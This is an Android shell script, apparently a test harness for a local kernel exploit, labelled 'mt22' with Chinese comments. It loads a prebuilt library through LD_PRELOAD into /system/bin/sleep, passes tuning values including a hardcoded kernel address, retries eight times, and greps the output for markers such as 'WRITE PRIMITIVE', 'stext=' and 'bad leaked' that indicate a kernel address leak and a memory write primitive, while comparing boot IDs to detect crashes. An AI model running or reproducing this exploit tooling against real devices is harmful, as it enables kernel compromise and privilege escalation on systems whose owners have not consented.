#!/system/bin/sh
# mt22: pselect overlay + futex 触发 + 8 轮重试 + boot_id 验证
SRC=/sdcard/Documents/matisse_backup_essentials/preload_mt22.so
DST=/data/local/tmp/preload.so
LOG=/sdcard/Documents/matisse_backup_essentials/logs/mt22.txt
RUNLOG=/data/local/tmp/mt22_run.out
rm -f $DST; cp $SRC $DST; sync
echo "boot_before=$(cat /proc/sys/kernel/random/boot_id)" > $LOG
am kill-all 2>&1 | tail -1
rm -f $RUNLOG
timeout 200 env \
  PSELECT_SLIDE_TRIGGER=1 \
  PSELECT_RETRY=8 \
  PSELECT_TREE_PC=ffffff80028a77c8 \
  PSELECT_TREE_LEFT=0 \
  PSELECT_SKIP_WARMUP=1 \
  LD_PRELOAD=$DST /system/bin/sleep 160 > $RUNLOG 2>&1
echo "run_rc=$?" >> $LOG
grep -a 'mt22:\|WRITE PRIMITIVE\|stext=\|FCRQ\|FLPI\|bad leaked\|SLIDE page' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
echo "boot_after=$(cat /proc/sys/kernel/random/boot_id)" >> $LOG
echo "=== DONE ===" >> $LOG
